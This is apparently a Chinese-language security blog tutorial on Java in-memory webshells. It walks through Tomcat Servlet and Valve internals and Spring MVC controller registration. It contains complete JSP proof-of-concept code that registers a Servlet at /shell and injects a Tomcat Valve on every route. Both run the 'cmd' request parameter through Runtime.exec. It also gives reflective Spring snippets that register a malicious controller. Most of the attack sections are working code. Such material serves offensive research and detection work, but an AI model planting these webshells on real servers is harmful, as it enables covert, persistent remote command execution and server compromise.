接下来同样我们需要思考要怎么动态注册Servlet，所以先看一下它的创建过程
创建过程我们知道Servlet的生命周期分为如下五部分

加载：当Tomcat第一次访问Servlet的时候，Tomcat会负责创建Servlet的实例
初始化：当Servlet被实例化后，Tomcat会调用init()方法初始化这个对象
处理服务：当浏览器访问Servlet的时候，Servlet 会调用service()方法处理请求
销毁：当Tomcat关闭时或者检测到Servlet要从Tomcat删除的时候会自动调用destroy()方法，让该实例释放掉所占的资源。一个Servlet如果长时间不被使用的话，也会被Tomcat自动销毁
卸载：当Servlet调用完destroy()方法后，等待垃圾回收。如果有需要再次使用这个Servlet，会重新调用init()方法进行初始化操作

Java Web三大件的加载顺序为Listener-&gt;Filter-&gt;Servlet
在org.apache.catalina.core.StandardContext类的startInternal()方法中，首先调用了listenerStart()，接着是filterStart()，最后是loadOnStartup()。这三处调用触发了Listener、Filter、Servlet的构造加载
...if (ok) &#123;                if (!listenerStart()) &#123;                    log.error(sm.getString(&quot;standardContext.listenerFail&quot;));                    ok = false;                &#125;            &#125;             // Check constraints for uncovered HTTP methods            // Needs to be after SCIs and listeners as they may programmatically            // change constraints            if (ok) &#123;                checkConstraintsForUncoveredMethods(findConstraints());            &#125;             try &#123;                // Start manager                Manager manager = getManager();                if (manager instanceof Lifecycle) &#123;                    ((Lifecycle) manager).start();                &#125;            &#125; catch(Exception e) &#123;                log.error(sm.getString(&quot;standardContext.managerFail&quot;), e);                ok = false;            &#125;             // Configure and call application filters            if (ok) &#123;                if (!filterStart()) &#123;                    log.error(sm.getString(&quot;standardContext.filterFail&quot;));                    ok = false;                &#125;            &#125;             // Load and initialize all &quot;load on startup&quot; servlets            if (ok) &#123;                if (!loadOnStartup(findChildren()))&#123;                    log.error(sm.getString(&quot;standardContext.servletFail&quot;));                    ok = false;                &#125;            &#125;             // Start ContainerBackgroundProcessor thread            super.threadStart();        &#125; finally &#123;            // Unbinding thread            unbindThread(oldCCL);        &#125;...

创建StandardWrapper在StandardContext#startInternal中，调用了fireLifecycleEvent()方法解析web.xml文件，我们跟进


继续跟进lifecycleEvent方法

跟进configureStart()方法

最终通过ContextConfig#webConfig()方法解析web.xml获取各种配置参数


然后通过configureContext(webXml)方法创建StandWrapper对象，并根据解析参数初始化StandWrapper对象
	
跟进该方法中
 private void configureContext(WebXml webxml) &#123;        // As far as possible, process in alphabetical order so it is easy to        // check everything is present        // Some validation depends on correct public ID        context.setPublicId(webxml.getPublicId()); ...   //设置StandardContext参数                 for (ServletDef servlet : webxml.getServlets().values()) &#123;             //创建StandardWrapper对象            Wrapper wrapper = context.createWrapper();             if (servlet.getLoadOnStartup() != null) &#123;                 //设置LoadOnStartup属性                wrapper.setLoadOnStartup(servlet.getLoadOnStartup().intValue());            &#125;            if (servlet.getEnabled() != null) &#123;                wrapper.setEnabled(servlet.getEnabled().booleanValue());            &#125;             //设置ServletName属性            wrapper.setName(servlet.getServletName());            Map&lt;String,String&gt; params = servlet.getParameterMap();            for (Entry&lt;String, String&gt; entry : params.entrySet()) &#123;                wrapper.addInitParameter(entry.getKey(), entry.getValue());            &#125;            wrapper.setRunAs(servlet.getRunAs());            Set&lt;SecurityRoleRef&gt; roleRefs = servlet.getSecurityRoleRefs();            for (SecurityRoleRef roleRef : roleRefs) &#123;                wrapper.addSecurityReference(                        roleRef.getName(), roleRef.getLink());            &#125;             //设置ServletClass属性            wrapper.setServletClass(servlet.getServletClass());            ...            wrapper.setOverridable(servlet.isOverridable());             //将包装好的StandWrapper添加进ContainerBase的children属性中            context.addChild(wrapper);            for (Entry&lt;String, String&gt; entry :                webxml.getServletMappings().entrySet()) &#123;                      //添加路径映射            context.addServletMappingDecoded(entry.getKey(), entry.getValue());        &#125;        &#125;        ...    &#125;

最后通过addServletMappingDecoded方法添加Servlet对应的url映射

加载StandWrapper接着在StandardContext#startInternal方法通过findChildren()获取StandardWrapper类

最后依次加载完Listener、Filter后，就通过loadOnStartUp()方法加载wrapper
public boolean loadOnStartup(Container children[]) &#123;     // Collect &quot;load on startup&quot; servlets that need to be initialized    TreeMap&lt;Integer, ArrayList&lt;Wrapper&gt;&gt; map = new TreeMap&lt;&gt;();    for (Container child : children) &#123;        Wrapper wrapper = (Wrapper) child;        int loadOnStartup = wrapper.getLoadOnStartup();         //判断属性loadOnStartup的值        if (loadOnStartup &lt; 0) &#123;            continue;        &#125;        Integer key = Integer.valueOf(loadOnStartup);        ArrayList&lt;Wrapper&gt; list = map.get(key);        if (list == null) &#123;            list = new ArrayList&lt;&gt;();            map.put(key, list);        &#125;        list.add(wrapper);    &#125;     // Load the collected &quot;load on startup&quot; servlets    for (ArrayList&lt;Wrapper&gt; list : map.values()) &#123;        for (Wrapper wrapper : list) &#123;            try &#123;                wrapper.load();            &#125;

注意这里对于Wrapper对象中loadOnStartup属性的值进行判断，只有大于0的才会被放入list进行后续的wrapper.load()加载调用
这里对应的实际上就是Tomcat Servlet的懒加载机制，可以通过loadOnStartup属性值来设置每个Servlet的启动顺序。默认值为-1，此时只有当Servlet被调用时才加载到内存中

至此Servlet才被加载到内存中
动态注册Servlet通过上述分析我们可以总结出创建Servlet的流程

获取StandardContext对象
编写恶意Servlet
通过StandardContext.createWrapper()创建StandardWrapper对象
设置StandardWrapper对象的loadOnStartup属性值
设置StandardWrapper对象的ServletName属性值
设置StandardWrapper对象的ServletClass属性值
将StandardWrapper对象添加进StandardContext对象的children属性中
通过StandardContext.addServletMappingDecoded()添加对应的路径映射

获取StandardContext对象StandardContext对象获取方式多种多样
&lt;%    Field reqF = request.getClass().getDeclaredField(&quot;request&quot;);    reqF.setAccessible(true);    Request req = (Request) reqF.get(request);    StandardContext standardContext = (StandardContext) req.getContext();%&gt;

或
&lt;%    ServletContext servletContext = request.getSession().getServletContext();    Field appContextField = servletContext.getClass().getDeclaredField(&quot;context&quot;);    appContextField.setAccessible(true);    ApplicationContext applicationContext = (ApplicationContext) appContextField.get(servletContext);    Field standardContextField = applicationContext.getClass().getDeclaredField(&quot;context&quot;);    standardContextField.setAccessible(true);    StandardContext standardContext = (StandardContext) standardContextField.get(applicationContext);%&gt;

编写恶意Servlet&lt;%!     public class Shell_Servlet implements Servlet &#123;        @Override        public void init(ServletConfig config) throws ServletException &#123;        &#125;        @Override        public ServletConfig getServletConfig() &#123;            return null;        &#125;        @Override        public void service(ServletRequest req, ServletResponse res) throws ServletException, IOException &#123;            String cmd = req.getParameter(&quot;cmd&quot;);            if (cmd !=null)&#123;                try&#123;                    Runtime.getRuntime().exec(cmd);                &#125;catch (IOException e)&#123;                    e.printStackTrace();                &#125;catch (NullPointerException n)&#123;                    n.printStackTrace();                &#125;            &#125;        &#125;        @Override        public String getServletInfo() &#123;            return null;        &#125;        @Override        public void destroy() &#123;        &#125;    &#125; %&gt;

创建Wrapper对象&lt;%    Shell_Servlet shell_servlet = new Shell_Servlet();    String name = shell_servlet.getClass().getSimpleName();     Wrapper wrapper = standardContext.createWrapper();    wrapper.setLoadOnStartup(1);    wrapper.setName(name);    wrapper.setServlet(shell_servlet);    wrapper.setServletClass(shell_servlet.getClass().getName());%&gt;

将Wrapper添加进StandardContext&lt;%    standardContext.addChild(wrapper);    standardContext.addServletMappingDecoded(&quot;/shell&quot;,name);%&gt;

完整POC&lt;%@ page import=&quot;java.lang.reflect.Field&quot; %&gt;&lt;%@ page import=&quot;org.apache.catalina.core.StandardContext&quot; %&gt;&lt;%@ page import=&quot;org.apache.catalina.connector.Request&quot; %&gt;&lt;%@ page import=&quot;java.io.IOException&quot; %&gt;&lt;%@ page import=&quot;org.apache.catalina.Wrapper&quot; %&gt;&lt;%@ page contentType=&quot;text/html;charset=UTF-8&quot; language=&quot;java&quot; %&gt; &lt;%    Field reqF = request.getClass().getDeclaredField(&quot;request&quot;);    reqF.setAccessible(true);    Request req = (Request) reqF.get(request);    StandardContext standardContext = (StandardContext) req.getContext();%&gt; &lt;%!     public class Shell_Servlet implements Servlet &#123;        @Override        public void init(ServletConfig config) throws ServletException &#123;        &#125;        @Override        public ServletConfig getServletConfig() &#123;            return null;        &#125;        @Override        public void service(ServletRequest req, ServletResponse res) throws ServletException, IOException &#123;            String cmd = req.getParameter(&quot;cmd&quot;);            if (cmd !=null)&#123;                try&#123;                    Runtime.getRuntime().exec(cmd);                &#125;catch (IOException e)&#123;                    e.printStackTrace();                &#125;catch (NullPointerException n)&#123;                    n.printStackTrace();                &#125;            &#125;        &#125;        @Override        public String getServletInfo() &#123;            return null;        &#125;        @Override        public void destroy() &#123;        &#125;    &#125; %&gt; &lt;%    Shell_Servlet shell_servlet = new Shell_Servlet();    String name = shell_servlet.getClass().getSimpleName();     Wrapper wrapper = standardContext.createWrapper();    wrapper.setLoadOnStartup(1);    wrapper.setName(name);    wrapper.setServlet(shell_servlet);    wrapper.setServletClass(shell_servlet.getClass().getName());%&gt; &lt;%    standardContext.addChild(wrapper);    standardContext.addServletMappingDecoded(&quot;/shell&quot;,name);%&gt;

访问Servlet.jsp动态注册Servlet

然后访问对应的映射路径执行命令

Servlet型内存马的缺点就是必须要访问对应的路径才能命令执行，易被发现
Valve型什么是valve？在了解Valve之前，我们先来简单了解一下Tomcat中的管道机制。
我们知道，当Tomcat接收到客户端请求时，首先会使用Connector进行解析，然后发送到Container进行处理。那么我们的消息又是怎么在四类子容器中层层传递，最终送到Servlet进行处理的呢？这里涉及到的机制就是Tomcat管道机制。
管道机制主要涉及到两个名词，Pipeline（管道）和Valve（阀门）。如果我们把请求比作管道（Pipeline）中流动的水，那么阀门（Valve）就可以用来在管道中实现各种功能，如控制流速等。因此通过管道机制，我们能按照需求，给在不同子容器中流通的请求添加各种不同的业务逻辑，并提前在不同子容器中完成相应的逻辑操作。这里的调用流程可以类比为Filter中的责任链机制

在Tomcat中，四大组件Engine、Host、Context以及Wrapper都有其对应的Valve类，StandardEngineValve、StandardHostValve、StandardContextValve以及StandardWrapperValve，他们同时维护一个StandardPipeline实例
与Filter之间的区别


特性
Valve（阀门）
Filter（过滤器）



层级
Tomcat 容器级别（更底层）
Servlet 规范级别（应用层）


影响范围
全局生效（影响所有部署在 Tomcat 中的应用）
仅对单个 Web 应用生效


可见性
由 Tomcat 直接管理
由 Servlet 容器（如 Tomcat）管理


完整的请求流程如下：
Tomcat 接收请求 → Valve 链（Engine → Host → Context → Wrapper） → Filter 链 → Servlet

管道机制流程分析我们先来看看Pipeline接口，继承了Contained接口
public interface Pipeline extends Contained &#123;     public Valve getBasic();     public void setBasic(Valve valve);     public void addValve(Valve valve);     public Valve[] getValves();     public void removeValve(Valve valve);     public void findNonAsyncValves(Set&lt;String&gt; result);&#125;

Pipeline接口提供了各种对Valve的操作方法，如我们可以通过addValve()方法来添加一个Valve。下面我们再来看看Valve接口
public interface Valve &#123;     public Valve getNext();     public void setNext(Valve valve);     public void backgroundProcess();     public void invoke(Request request, Response response)        throws IOException, ServletException;     public boolean isAsyncSupported();&#125;

其中getNext()方法可以用来获取下一个Valve，Valve的调用过程可以理解成类似Filter中的责任链模式，按顺序调用。

同时Valve可以通过重写invoke()方法来实现具体的业务逻辑
class Shell_Valve extends ValveBase &#123;         @Override        public void invoke(Request request, Response response) throws IOException, ServletException &#123;            ...            &#125;        &#125;    &#125;

下面我们通过源码看一看，消息在容器之间是如何传递的。首先消息传递到Connector被解析后，在org.apache.catalina.connector.CoyoteAdapter#service方法中
public void service(org.apache.coyote.Request req, org.apache.coyote.Response res) throws Exception &#123;    Request request = (Request) req.getNote(ADAPTER_NOTES);        Response response = (Response) res.getNote(ADAPTER_NOTES);         if (request == null) &#123;            // Create objects            request = connector.createRequest();            request.setCoyoteRequest(req);            response = connector.createResponse();            response.setCoyoteResponse(res);             // Link objects            request.setResponse(response);            response.setRequest(request);             // Set as notes            req.setNote(ADAPTER_NOTES, request);            res.setNote(ADAPTER_NOTES, response);             // Set query string encoding            req.getParameters().setQueryStringCharset(connector.getURICharset());        &#125;...     try &#123;            ...            connector.getService().getContainer().getPipeline().getFirst().invoke(   request, response);            &#125;...&#125;

前面是对Request和Respone对象进行一些判断及创建操作，我们重点来看一下connector.getService().getContainer().getPipeline().getFirst().invoke(request, response)
首先通过connector.getService()来获取一个StandardService对象

接着通过StandardService.getContainer().getPipeline()获取StandardPipeline对象。
再通过StandardPipeline.getFirst()获取第一个Valve
@Override    public Valve getFirst() &#123;        if (first != null) &#123;            return first;        &#125;         return basic;    &#125;

最后通过调用StandardEngineValve.invoke()来实现Valve的各种业务逻辑
public final void invoke(Request request, Response response)        throws IOException, ServletException &#123;         // Select the Host to be used for this Request        Host host = request.getHost();        if (host == null) &#123;            // HTTP 0.9 or HTTP 1.0 request without a host when no default host            // is defined.            // Don&#x27;t overwrite an existing error            if (!response.isError()) &#123;                response.sendError(404);            &#125;            return;        &#125;        if (request.isAsyncSupported()) &#123;            request.setAsyncSupported(host.getPipeline().isAsyncSupported());        &#125;         // Ask this Host to process this request        host.getPipeline().getFirst().invoke(request, response);    &#125;

host.getPipeline().getFirst().invoke(request, response)实现调用后续的Valve
动态添加Valve根据上文的分析我们能够总结出Valve型内存马的注入思路

获取StandardContext对象
通过StandardContext对象获取StandardPipeline
编写恶意Valve
通过StandardPipeline.addValve()动态添加Valve

获取StandardPipeline对象&lt;%    Field reqF = request.getClass().getDeclaredField(&quot;request&quot;);    reqF.setAccessible(true);    Request req = (Request) reqF.get(request);    StandardContext standardContext = (StandardContext) req.getContext();     Pipeline pipeline = standardContext.getPipeline();%&gt;

编写恶意Valve类&lt;%!    class Shell_Valve extends ValveBase &#123;         @Override        public void invoke(Request request, Response response) throws IOException, ServletException &#123;            String cmd = request.getParameter(&quot;cmd&quot;);            if (cmd !=null)&#123;                try&#123;                    Runtime.getRuntime().exec(cmd);                &#125;catch (IOException e)&#123;                    e.printStackTrace();                &#125;catch (NullPointerException n)&#123;                    n.printStackTrace();                &#125;            &#125;        &#125;    &#125;%&gt;

将恶意Valve添加进StandardPipeline&lt;%    Shell_Valve shell_valve = new Shell_Valve();    pipeline.addValve(shell_valve);%&gt;

完整POC&lt;%@ page import=&quot;java.lang.reflect.Field&quot; %&gt;&lt;%@ page import=&quot;org.apache.catalina.core.StandardContext&quot; %&gt;&lt;%@ page import=&quot;org.apache.catalina.connector.Request&quot; %&gt;&lt;%@ page import=&quot;org.apache.catalina.Pipeline&quot; %&gt;&lt;%@ page import=&quot;org.apache.catalina.valves.ValveBase&quot; %&gt;&lt;%@ page import=&quot;org.apache.catalina.connector.Response&quot; %&gt;&lt;%@ page import=&quot;java.io.IOException&quot; %&gt;&lt;%@ page contentType=&quot;text/html;charset=UTF-8&quot; language=&quot;java&quot; %&gt; &lt;%    Field reqF = request.getClass().getDeclaredField(&quot;request&quot;);    reqF.setAccessible(true);    Request req = (Request) reqF.get(request);    StandardContext standardContext = (StandardContext) req.getContext();     Pipeline pipeline = standardContext.getPipeline();%&gt; &lt;%!    class Shell_Valve extends ValveBase &#123;         @Override        public void invoke(Request request, Response response) throws IOException, ServletException &#123;            String cmd = request.getParameter(&quot;cmd&quot;);            if (cmd !=null)&#123;                try&#123;                    Runtime.getRuntime().exec(cmd);                &#125;catch (IOException e)&#123;                    e.printStackTrace();                &#125;catch (NullPointerException n)&#123;                    n.printStackTrace();                &#125;            &#125;        &#125;    &#125;%&gt; &lt;%    Shell_Valve shell_valve = new Shell_Valve();    pipeline.addValve(shell_valve);%&gt;

访问Valve.jsp

访问任意路由执行命令

Spring内存马Spring基础概念Spring的出现大大简化了JavaEE的开发流程，减少了Java开发时各种繁琐的配置
Spring框架的核心之一就是分层，其由许多大大小小的组件构成，每种组件都实现不同功能

SpringBootSpringBoot 基于 Spring 开发。不仅继承了Spring框架原有的优秀特性，它并不是用来替代 Spring 的解决方案，而和 Spring 框架紧密 结合进一步简化了Spring应用的整个搭建和开发过程。其设计目的是用来简化 Spring 应用的初始搭建以及开发过程。
采用 Spring Boot 可以大大的简化开发模式，它集成了大量常用的第三方库配置，所有你想集成的常用框架，它都有对应的组件支持，例如 Redis、MongoDB、Dubbo、kafka，ES等等。SpringBoot 应用中这些第 三方库几乎可以零配置地开箱即用，大部分的 SpringBoot 应用都只需要非常少量的配置代码，开发者能够更加专注于业务逻辑。 另外SpringBoot通过集成大量的框架使得依赖包的版本冲突，以及引用的不稳定性等问题得到了很好的解决。
下面我们就通过IDEA中的Spring Initializr来快速构建一个基于SpringBoot的Web项目


点击下一步，选择spring web


直接创建就行了
接下来我们就可以编写相应的Controller（控制器）及各种业务逻辑了
package org.example.spring_test.hello;import org.springframework.stereotype.Controller;import org.springframework.web.bind.annotation.RequestMapping;import org.springframework.web.bind.annotation.ResponseBody;@Controllerpublic class HelloWorldController &#123;    @ResponseBody    @RequestMapping(&quot;helloworld&quot;)    public String hello() &#123;        return &quot;Hello World&quot;;    &#125;&#125;

访问对应的路由

Spring MVC、Tomcat和Servlet首先来设想这样一个场景，假如让我们自己手动实现一个简易的Web服务器，我们会怎么做？
首先我们肯定要接收客户端发来的TCP数据包，这里我们需要一个TCPServer来监听80端口。接着我们需要将TCP数据包解析成HTTP协议，获取URL路径、参数列表等数据信息。再然后就是执行各种逻辑处理。最后就是把处理的结果封装成HTTP协议返回给浏览器，并且等浏览器收到响应后断开连接。以上就是一个简易Web服务器的实现逻辑，当然，真正的Web服务器可能要比上述更加复杂一些，但核心功能是不变的：接受请求、处理请求、返回响应

当然，如果我们在处理业务时每次都要进行一遍上述流程，这未免太繁琐。其实我们可以发现在上述流程中，网络通信、HTTP协议解析和封装部分的实现都相对固定。有变化的部分其实只有逻辑处理器，需要我们根据不同请求包而做出相应的逻辑处理。因此，为了提高开发效率，我们能不能将不变的部分封装起来呢？这其实就是我们的Web服务器。
Tomcat就是这样一种服务器，它其实就是一个能够监听TCP连接请求，解析HTTP报文，将解析结果传给处理逻辑器、接收处理逻辑器的返回结果并通过TCP返回给浏览器的一个框架。在Tomcat各种组件中，Connnector就是负责网络通信的，而Container中的Servlet就是我们的逻辑处理器
因此Tomcat就是一个Servlet容器，它将前后端交互过程中不变的东西（网络通信、协议解析等）封装了起来。而Servlet是一个逻辑处理器，它可以被Tomcat创建、调用和销毁。所以我们的Web程序核心是基于Servlet的，而Web程序的启动依靠Tomcat
那Spring MVC呢？Spring是利用注解、反射和模板等技术实现的一种框架。其核心类是继承于HttpServlet的DispatchServlet。那既然是Servlet，那负责的肯定就是逻辑处理部分了，那么就需要Tomcat这样的服务器来给Spring提供运行环境
Spring MVCspring MVC的运行流程如下

客户端发送Request，DispatcherServlet(等同于Controller控制器)，控制器接收到请求，来到HandlerMapping（在配置文件中配置），HandlerMapping会对URL进行解析，并判断当前URL该交给哪个Controller来处理，找到对应的Controller之后，Controller就跟Server、JavaBean进行交互，得到某一个值，并返回一个视图（ModelAndView过程），Dispathcher通过ViewResolver视图解析器,找到ModelAndView对象指定的视图对象,最后，视图对象负责渲染返回给客户端
创建一个简单的springmvc项目
可直接看该文章来搭建：https://goodapple.top/archives/1355
文章里面说的搭建maven项目，建议选择如下，较为简单：

配置完之后启动tomcat，访问hello路由


上面环境搭建是搭建，但是下面学习spring内存马还是通过springboot构建项目，java版本为8u65，要记得勾选springweb

Controller型内存马基础概念一、Spring Bean（下面简称为“Bean”）
定义：
在Spring中，构成应用程序主干并由Spring IoC容器管理的对象称为bean。bean是由Spring IoC容器实例化、组装和管理的对象。Spring Bean代表着Spring中最小的执行单位，其加载、作用域、生命周期的管理都由Spring操作。
为什么需要Bean：
可以将Spring IoC容器类比为一位高效的“管家”，而Bean就是这位管家为你准备的一切资源和服务。作为程序员，你只需要声明你需要什么（即注入某个Bean），Spring就会负责将其准备好并交付给你使用。至于这个Bean是如何创建、配置、存放的，开发者无需关心，Spring都已替你打理妥当。
综上所述，我们很容易知道Bean有以下特点：

bean 是对象
bean 被 IoC 容器管理
Spring 应用主要是由一个个的 bean 构成的

二、Spring IOC容器（下面简称为“Ioc容器”）
定义：
控制反转英文全称：Inversion of Control，简称就是IoC。控制反转通过依赖注入（DI）方式实现对象之间的松耦合关系。程序运行时，依赖对象由辅助程序动态生成并注入到被依赖对象中，动态绑定两者的使用关系。Spring IoC容器就是这样的辅助程序，它负责对象的生成和依赖的注入，然后再交由我们使用。
为什么需要Ioc容器：
在实际开发中，Bean之间往往存在依赖关系，它们并不是孤立存在的。比如，一个A对象在工作时，需要依赖B和C对象提供支持。如果由A自己去创建B和C，不仅麻烦，还会导致组件之间耦合紧密，难以维护和测试。这时，IoC容器就派上用场了，它会在创建A对象时，自动先创建它所依赖的B和C对象，再把它们“注入”给 A。这样，A 就能顺利完成自己的功能，而不需要关心 B 和 C 是从哪儿来的、怎么创建的。
IOC容器通过读取配置元数据来获取对象的实例化、配置和组装的描述信息。配置的元数据可以用xml、Java注解或Java代码来表示。
三、ApplicationContext
Spring框架中，BeanFactory接口是Spring IoC容器的实际代表者。

实现了BeanFactory接口的ApplicationContext接口，显然也代表了IoC容器。因此得了ApplicationContext的实例，就获得了IoC容器的引用。我们可以从ApplicationContext中可以根据Bean的ID获取Bean。
我们的操作对象是Bean，如果要访问和操作bean ，一般要获得当前代码执行环境的IoC 容器代表者ApplicationContext。在Spring Web应用中，通常存在两个层级的 ApplicationContext：

一个Root ApplicationContext，由ContextLoaderListener创建，用于管理全局共享Bean（如Service、Repository等）；
一个或多个Child ApplicationContext，由DispatcherServlet创建，用于管理与Web层相关的Bean（如Controller、ViewResolver等）。

Child Context可以访问其父容器（Root Context）中的 Bean，但反过来不行。所有的Context在创建后，都会被作为一个属性添加到了ServletContext中
四、ContextLoaderListener
ContextLoaderListener主要被用来初始化全局唯一的Root Context，即Root WebApplicationContext。这个Root WebApplicationContext会和其他Child Context实例共享它的IoC容器，供其他Child Context获取并使用容器中的 bean
实现思路和Tomcat内存马类似，我们就需要了解如何动态的注册Controller，思路如下

获取上下文环境
注册恶意Controller
配置路径映射

获得WebApplicationContext第一种方法：getCurrentWebApplicationContextWebApplicationContext context = ContextLoader.getCurrentWebApplicationContext();

获得的是一个XmlWebApplicationContext实例类型的Root WebApplicationContext。
第二种方法：WebApplicationContextUtilsWebApplicationContext context = WebApplicationContextUtils.getWebApplicationContext(RequestContextUtils.getWebApplicationContext(((ServletRequestAttributes)RequestContextHolder.currentRequestAttributes()).getRequest()).getServletContext());

通过这种方法获得的也是一个 Root WebApplicationContext。其中 WebApplicationContextUtils.getWebApplicationContext 函数也可以用 WebApplicationContextUtils.getRequiredWebApplicationContext来替换。
但是在我当前的版本，也就是spring-web-5.2.23，RequestContextUtils类不再具有getWebApplicationContext方法
第三种方法：RequestContextUtils上面说了，在我当前的版本，只有findWebApplicationContext方法：
WebApplicationContext context2 = RequestContextUtils.findWebApplicationContext(((ServletRequestAttributes)RequestContextHolder.currentRequestAttributes()).getRequest());

通过ServletRequest类的实例来获得Child WebApplicationContext。
第四种方法：getAttributeWebApplicationContext context = (WebApplicationContext)RequestContextHolder.currentRequestAttributes().getAttribute(&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;, 0);

动态注册Controller枫神这段讲的太好了，直接照搬
Spring Controller的动态注册，就是对RequestMappingHandlerMapping注入的过程。
RequestMappingHandlerMapping是SpringMVC里面的核心Bean，Spring把我们的controller解析成RequestMappingInfo对象，然后再注册进RequestMappingHandlerMapping中，这样请求进来以后就可以根据请求地址调用到Controller类里面了。

RequestMappingHandlerMapping对象本身是Spring来管理的，可以通过ApplicationContext取到，所以并不需要我们新建。
在SpringMVC框架下，会有两个ApplicationContext，一个是Spring IOC的上下文，这个是在java web框架的Listener里面配置，就是我们经常用的web.xml里面的org.springframework.web.context.ContextLoaderListener，由它来完成IOC容器的初始化和bean对象的注入。
另外一个是ApplicationContext是由org.springframework.web.servlet.DispatcherServlet完成的，具体是在org.springframework.web.servlet.FrameworkServlet#initWebApplicationContext()这个方法做的。而这个过程里面会完成RequestMappingHandlerMapping这个对象的初始化。

Spring 2.5开始到Spring 3.1之前一般使用org.springframework.web.servlet.mvc.annotation.DefaultAnnotationHandlerMapping映射器；
Spring 3.1开始及以后一般开始使用新的org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping映射器来支持@Contoller和@RequestMapping注解。
registerMapping在Spring 4.0及以后，可以使用registerMapping直接注册requestMapping
// 1. 从当前上下文环境中获得 RequestMappingHandlerMapping 的实例 beanRequestMappingHandlerMapping r = context.getBean(RequestMappingHandlerMapping.class);// 2. 通过反射获得自定义 controller 中唯一的 Method 对象Method method = (Class.forName(&quot;me.landgrey.SSOLogin&quot;).getDeclaredMethods())[0];// 3. 定义访问 controller 的 URL 地址PatternsRequestCondition url = new PatternsRequestCondition(&quot;/hahaha&quot;);// 4. 定义允许访问 controller 的 HTTP 方法（GET/POST）RequestMethodsRequestCondition ms = new RequestMethodsRequestCondition();// 5. 在内存中动态注册 controllerRequestMappingInfo info = new RequestMappingInfo(url, ms, null, null, null, null, null);r.registerMapping(info, Class.forName(&quot;恶意Controller&quot;).newInstance(), method);

registerHandler参考上面的HandlerMapping接口继承关系图，针对使用DefaultAnnotationHandlerMapping映射器的应用，可以找到它继承的顶层类org.springframework.web.servlet.handler.AbstractUrlHandlerMapping。
在其registerHandler()方法中
protected void registerHandler(String urlPath, Object handler) throws BeansException, IllegalStateException &#123;	Assert.notNull(urlPath, &quot;URL path must not be null&quot;);	Assert.notNull(handler, &quot;Handler object must not be null&quot;);	Object resolvedHandler = handler;	// Eagerly resolve handler if referencing singleton via name.	if (!this.lazyInitHandlers &amp;&amp; handler instanceof String) &#123;		String handlerName = (String) handler;		ApplicationContext applicationContext = obtainApplicationContext();		if (applicationContext.isSingleton(handlerName)) &#123;			resolvedHandler = applicationContext.getBean(handlerName);		&#125;	&#125;	Object mappedHandler = this.handlerMap.get(urlPath);	if (mappedHandler != null) &#123;		if (mappedHandler != resolvedHandler) &#123;			throw new IllegalStateException(					&quot;Cannot map &quot; + getHandlerDescription(handler) + &quot; to URL path [&quot; + urlPath +					&quot;]: There is already &quot; + getHandlerDescription(mappedHandler) + &quot; mapped.&quot;);		&#125;	&#125;	else &#123;		if (urlPath.equals(&quot;/&quot;)) &#123;			if (logger.isTraceEnabled()) &#123;				logger.trace(&quot;Root mapping to &quot; + getHandlerDescription(handler));			&#125;			setRootHandler(resolvedHandler);		&#125;		else if (urlPath.equals(&quot;/*&quot;)) &#123;			if (logger.isTraceEnabled()) &#123;				logger.trace(&quot;Default mapping to &quot; + getHandlerDescription(handler));			&#125;			setDefaultHandler(resolvedHandler);		&#125;		else &#123;			this.handlerMap.put(urlPath, resolvedHandler);			if (getPatternParser() != null) &#123;				this.pathPatternHandlerMap.put(getPatternParser().parse(urlPath), resolvedHandler);			&#125;			if (logger.isTraceEnabled()) &#123;				logger.trace(&quot;Mapped [&quot; + urlPath + &quot;] onto &quot; + getHandlerDescription(handler));			&#125;		&#125;	&#125;&#125;

该方法接受urlPath参数和handler参数，可以在this.getApplicationContext() 获得的上下文环境中寻找名字为handler 参数值的bean, 将url和controller实例bean注册到handlerMap中。
// 1. 在当前上下文环境中注册一个名为 dynamicController 的 Webshell controller 实例 beancontext.getBeanFactory().registerSingleton(&quot;dynamicController&quot;, Class.forName(&quot;me.landgrey.SSOLogin&quot;).newInstance());// 2. 从当前上下文环境中获得 DefaultAnnotationHandlerMapping 的实例 beanorg.springframework.web.servlet.mvc.annotation.DefaultAnnotationHandlerMapping  dh = context.getBean(org.springframework.web.servlet.mvc.annotation.DefaultAnnotationHandlerMapping.class);// 3. 反射获得 registerHandler Methodjava.lang.reflect.Method m1 = org.springframework.web.servlet.handler.AbstractUrlHandlerMapping.class.getDeclaredMethod(&quot;registerHandler&quot;, String.class, Object.class);m1.setAccessible(true);// 4. 将 dynamicController 和 URL 注册到 handlerMap 中m1.invoke(dh, &quot;/favicon&quot;, &quot;dynamicController&quot;);

detectHandlerMethods参考上面的HandlerMapping接口继承关系图，针对使用RequestMappingHandlerMapping映射器的应用，可以找到它继承的顶层类org.springframework.web.servlet.handler.AbstractHandlerMethodMapping
在其detectHandlerMethods方法中：
protected void detectHandlerMethods(Object handler) &#123;    Class&lt;?&gt; handlerType = handler instanceof String ? this.getApplicationContext().getType((String)handler) : handler.getClass();    final Class&lt;?&gt; userType = ClassUtils.getUserClass(handlerType);    Set&lt;Method&gt; methods = HandlerMethodSelector.selectMethods(userType, new MethodFilter() &#123;        public boolean matches(Method method) &#123;            return AbstractHandlerMethodMapping.this.getMappingForMethod(method, userType) != null;        &#125;    &#125;);    Iterator var6 = methods.iterator();    while(var6.hasNext()) &#123;        Method method = (Method)var6.next();        T mapping = this.getMappingForMethod(method, userType);        this.registerHandlerMethod(handler, method, mapping);    &#125;&#125;

方法仅接受handler参数，同样可以 this.getApplicationContext()获得的上下文环境中寻找名字为handler参数值的 bean, 并注册controller的实例bean
context.getBeanFactory().registerSingleton(&quot;dynamicController&quot;, Class.forName(&quot;恶意Controller&quot;).newInstance());org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping requestMappingHandlerMapping = context.getBean(org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping.class);java.lang.reflect.Method m1 = org.springframework.web.servlet.handler.AbstractHandlerMethodMapping.class.getDeclaredMethod(&quot;detectHandlerMethods&quot;, Object.class);m1.setAccessible(true);m1.invoke(requestMappingHandlerMapping, &quot;dynamicController&quot;);

实现恶意Controller由于是动态路由，所以我们只需要实现方法即可，比如
public class Controller_Shell&#123;	public Controller_Shell()&#123;&#125;     public void shell() throws IOException &#123;        //获取request        HttpServletRequest request = ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getRequest();        Runtime.getRuntime().exec(request.getParameter(&quot;cmd&quot;));    &#125;&#125;

